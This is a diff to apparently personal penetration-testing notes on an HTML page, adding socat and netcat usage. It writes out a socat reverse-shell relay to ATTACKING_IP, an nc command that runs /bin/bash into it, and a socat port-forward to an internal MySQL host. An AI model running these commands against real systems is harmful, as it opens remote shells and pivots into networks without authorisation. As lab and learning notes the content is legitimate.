@@ -77,5 +77,18 @@ toc_sticky: true
 <code>puttygen KEYFILE -o OUTPUT_KEY.ppk</code>
 <h4>Socat</h4>
 <p>Static Binaries for Socat</p>
-<a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">Socat for Linux</a>
+<a href="https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat">Socat for Linux | </a>
 <a href="https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download">Socat for Windows</a>
+<p>Watch IPPSEC do hackthebox - worker</p>
+
+<p>Reverse Shell Relay</p>
+<code>./socat tcp-l:8000 tcp:ATTACKING_IP:443 &</code>
+<ul>
+  <li>tcp-l:8000 = used to create the first half of the connection -- ipv4 listener on tcp port 8000 of the victim</li>
+  <li>tcp:attacking_ip:443 = connects back to our local IP on port 443</li>
+  <li>& =  backgrounds the listener</li>
+</ul>
+<p>this will connect back to our machine so we need to setup a netcat listener</p>
+<code>./nc-hyst 127.0.0.1 8000 -e /bin/bash</code>
+<p>Port Forwarding using Socat</p>
+<code>./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &</code>
